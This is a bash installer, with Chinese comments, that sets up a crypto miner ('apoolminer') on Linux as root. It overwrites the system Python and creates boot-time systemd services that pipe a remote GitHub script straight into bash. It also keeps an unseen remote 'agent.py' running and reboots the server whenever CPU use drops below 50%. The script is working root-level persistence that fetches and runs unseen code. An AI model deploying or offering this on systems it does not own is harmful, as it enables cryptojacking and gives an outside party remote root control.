#!/bin/bash
set -e

# ---------------- 提权检查 ----------------
if [ "$EUID" -ne 0 ]; then
    echo "非 root 用户，使用 sudo 提权..."
    exec sudo bash "$0" "$@"
fi

# ---------------- 参数 ----------------
WORKDIR="/root"
LOG_FILE="$WORKDIR/miner.log"
SCRIPT_URL="https://raw.githubusercontent.com/shishen12138/ssyml/main/1.sh"
AGENT_URL="https://raw.githubusercontent.com/shishen12138/ssyml/main/agent.py"
WATCHDOG_SCRIPT="$WORKDIR/cpu_watchdog.sh"
AGENT_SCRIPT="$WORKDIR/agent.py"

# ---------------- 系统类型检测 ----------------
if [ -f /etc/debian_version ]; then
    DISTRO="debian"
    apt update
    apt install -y wget build-essential libssl-dev zlib1g-dev \
        libbz2-dev libreadline-dev libsqlite3-dev curl llvm \
        libncurses5-dev libncursesw5-dev xz-utils tk-dev \
        libffi-dev liblzma-dev python3-openssl git
elif [ -f /etc/redhat-release ]; then
    DISTRO="redhat"
    yum install -y wget gcc gcc-c++ make bzip2 bzip2-devel \
        xz-devel zlib-devel libffi-devel readline-devel \
        sqlite sqlite-devel curl llvm ncurses-devel tk-devel git
else
    echo "未知 Linux 发行版"
    exit 1
fi

# ---------------- 获取最新 Python 版本 ----------------
PYTHON_LATEST=$(wget -qO- https://www.python.org/ftp/python/ | grep -Po '(?<=href=")[0-9]+\.[0-9]+\.[0-9]+(?=/")' | sort -V | tail -n1)
echo "最新 Python 版本: $PYTHON_LATEST"

# ---------------- 下载并安装 Python ----------------
echo "安装 Python $PYTHON_LATEST ..."
cd /usr/src
wget -q https://www.python.org/ftp/python/$PYTHON_LATEST/Python-$PYTHON_LATEST.tgz
tar xzf Python-$PYTHON_LATEST.tgz
cd Python-$PYTHON_LATEST
./configure --enable-optimizations
make -j$(nproc)
make altinstall

# 覆盖系统 python3
ln -sf /usr/local/bin/python3.${PYTHON_LATEST%%.*} /usr/bin/python3
ln -sf /usr/local/bin/pip3.${PYTHON_LATEST%%.*} /usr/bin/pip3

# ---------------- 安装 pip & 依赖 ----------------
echo "安装 pip 并安装依赖..."
python3 -m ensurepip --upgrade
python3 -m pip install --upgrade pip
python3 -m pip install --force-reinstall websockets psutil requests

# ---------------- 创建 miner.service ----------------
SERVICE_NAME="miner.service"
SERVICE_PATH="/etc/systemd/system/$SERVICE_NAME"
echo "创建 $SERVICE_NAME ..."
tee $SERVICE_PATH > /dev/null <<EOF
[Unit]
Description=Auto start apoolminer script
After=network.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'wget -q $SCRIPT_URL -O - | bash >> $LOG_FILE 2>&1'
RemainAfterExit=true
User=root
WorkingDirectory=$WORKDIR

[Install]
WantedBy=multi-user.target
EOF

# ---------------- 创建 CPU Watchdog ----------------
WATCHDOG_NAME="cpu-watchdog.service"
WATCHDOG_PATH="/etc/systemd/system/$WATCHDOG_NAME"
echo "创建 CPU Watchdog 脚本..."
tee $WATCHDOG_SCRIPT > /dev/null <<'EOF'
#!/bin/bash
LOG_FILE="/root/miner.log"
THRESHOLD=50
MAX_LOW=3
LOW_COUNT=0
echo "$(date) watchdog 启动" >> $LOG_FILE
while true; do
    IDLE=$(top -bn2 -d 1 | grep "Cpu(s)" | tail -n1 | awk '{print $8}' | cut -d. -f1)
    USAGE=$((100 - IDLE))
    echo "$(date) CPU 使用率: $USAGE%" >> $LOG_FILE
    if [ "$USAGE" -lt "$THRESHOLD" ]; then
        LOW_COUNT=$((LOW_COUNT+1))
        echo "$(date) CPU < $THRESHOLD%，连续低使用次数: $LOW_COUNT" >> $LOG_FILE
        if [ "$LOW_COUNT" -ge "$MAX_LOW" ]; then
            echo "$(date) CPU 连续低于 $THRESHOLD% $MAX_LOW 次，重启服务器..." >> $LOG_FILE
            reboot
        fi
    else
        LOW_COUNT=0
    fi
    sleep 30
done
EOF
chmod +x $WATCHDOG_SCRIPT

echo "创建 $WATCHDOG_NAME ..."
tee $WATCHDOG_PATH > /dev/null <<EOF
[Unit]
Description=CPU watchdog (reboot if CPU usage < 50% for 3 consecutive checks)
After=network.target

[Service]
ExecStart=/bin/bash $WATCHDOG_SCRIPT
Restart=always
User=root
WorkingDirectory=$WORKDIR

[Install]
WantedBy=multi-user.target
EOF

# ---------------- 下载 agent.py ----------------
echo "下载 agent.py ..."
wget -q $AGENT_URL -O $AGENT_SCRIPT
chmod +x $AGENT_SCRIPT

# ---------------- 创建 agent.service ----------------
AGENT_SERVICE_NAME="agent.service"
AGENT_PATH="/etc/systemd/system/$AGENT_SERVICE_NAME"
echo "创建 $AGENT_SERVICE_NAME ..."
tee $AGENT_PATH > /dev/null <<EOF
[Unit]
Description=Agent Python Script
After=network.target

[Service]
ExecStart=/usr/bin/python3 $AGENT_SCRIPT
Restart=always
User=root
WorkingDirectory=$WORKDIR

[Install]
WantedBy=multi-user.target
EOF

# ---------------- 启用并启动服务 ----------------
echo "重新加载 systemd 配置 ..."
systemctl daemon-reload

echo "启用开机自启 ..."
systemctl enable $SERVICE_NAME
systemctl enable $WATCHDOG_NAME
systemctl enable $AGENT_SERVICE_NAME

echo "立即启动服务 ..."
systemctl start $SERVICE_NAME
systemctl start $WATCHDOG_NAME
systemctl start $AGENT_SERVICE_NAME

# ---------------- 立即执行一次 1.sh & agent.py ----------------
echo "立即执行一次 1.sh ..."
wget -q $SCRIPT_URL -O - | bash 2>&1 | tee -a $LOG_FILE

echo "立即运行 agent.py ..."
nohup python3 $AGENT_SCRIPT >> $LOG_FILE 2>&1 &

echo "安装完成！日志: $LOG_FILE"
